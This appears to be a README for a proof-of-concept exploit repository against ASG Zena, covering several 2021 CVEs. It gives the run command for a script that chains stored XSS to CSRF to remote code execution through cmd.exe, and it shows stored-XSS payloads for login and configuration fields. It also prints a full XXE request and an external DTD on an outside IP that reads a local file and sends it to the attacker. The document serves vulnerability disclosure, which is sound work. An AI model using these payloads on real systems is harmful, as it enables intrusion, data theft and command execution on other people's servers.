# Zena
Proof of Concept code for XSS to CSRF to Remote Code Execution exploit for asg-zena
CVE-2021-45025 Cleartext Storage of Sensitive Information in a Cookie
CVE-2021-45026 Stored Cross Site Scripting (XSS)
Authors: James Barnett and Jeffrey Green
**To Run:**
- python CookieMonster.py <hostname/ip> <TLS/SSL - True or False> <cmd.exe command>
  - **Example: python3 CookieMonster.py 127.0.0.1 False "/c whoami > c:/out.txt"**


Basic payload and details and injection points

Zena – ClientManager:
XSS(Cross-Site Scripting):
• Type: Stored XSS – Unauthenticated
• Pages Affected: /zena/index.html
• Description: User input field(and probably more fields) on the Zena ClientManager login page allow for
an attacker to submit specially crafted javascript payloads that are persistently stored and executed
when a user on the Zena system navigates to Client Manager logs and shows details for the log.
POC code – placed into the username field on the login page: 

```</li><img/src='fail'/onerror=alert("vulnerable")></img>```

XSS(Cross-Site Scripting):
• Type: Stored XSS
• Pages Affected: /webconfig/index.html requires authentication. the webconfig page has a hardcoded default password.
• Description: Certain input fields in the connector creation allow for an attacker to submit specially
crafted arbitrary javascript payloads that are persistently stored and executed when loading the page
POC code - placed into the Name input field:

```</li><img/src='fail'/onerror=alert("vulnerable")></img>```

Proof of Concept code for XXE to SSRF to Data Exfiltration exploit for asg-zena
CVE-2021-45024
CVE-2021-45022 SSRF
Authors: James Barnett and Jeffrey Green

XXE(XML External Entity) (CWE-611):
• Type: SSRF and Exfiltration
• Pages Affected: /zena.index.html
• Endpoints Affected: oc_main/zenaweb/scheduler/operation
• Description: Several of the ClientManager’s import functions can be abused by manipulating the
XML import data to contain external entity values that can induce the server to perform certain
functions it was not intended to do. Ex. Reading a local file and exfiltrating it over an HTTP
request back to the attacker
Poc code - Request body to zena server:
```<?xml version="1.0" ?>
<!DOCTYPE r [
<!ELEMENT r ANY >
<!ENTITY % sp SYSTEM "http://52.15.202.214:8080/xxe.dtd">
%sp;
%param1;
%exfil;
]>
<PACKAGE CREATED="2022.02.15 21.49.34" EXCLUDE_PASSWORDS="NO" INCLUDE_AGENT_REFS="NO"
INCLUDE_DEF_REFS="NO" TYPE="4" UID="E311C8FC7118"><ITEMS><ITEM LIST_TYPE="4"
MODIFIED="2022.02.15 21.22.30" NAME="research" UID="A2A9235502DE"/></ITEMS><USERS><USER
MODIFIED="2022.02.15 21.22.30" NAME="research" REFERENCE="NO"
UID="A2A9235502DE"><![CDATA[<USER NAME="research"
PASSWORD="3jkY15nHscTNeexdKq+gVqiMsh1ngexPj4of7xliF3uDjnkTkJw7qq78ruSMvOGat"
UID="A2A9235502DE" LOGIN="research" DOMAIN="EC2AMAZ-57EH5UL" ALLRIGHTS="YES"
ALLAGENTS="YES"><DESCRIPTION></DESCRIPTION><ROLES/></USER>]]></USER></USERS></PACKAGE>```

```External DTD code hosted on attacker server as xxe.dtd:
<!ENTITY % data SYSTEM "file:///c:/sensative.txt">
<!ENTITY % param1 "<!ENTITY &#x25; exfil SYSTEM 'http://52.15.202.214:8080/?%data;'>">```

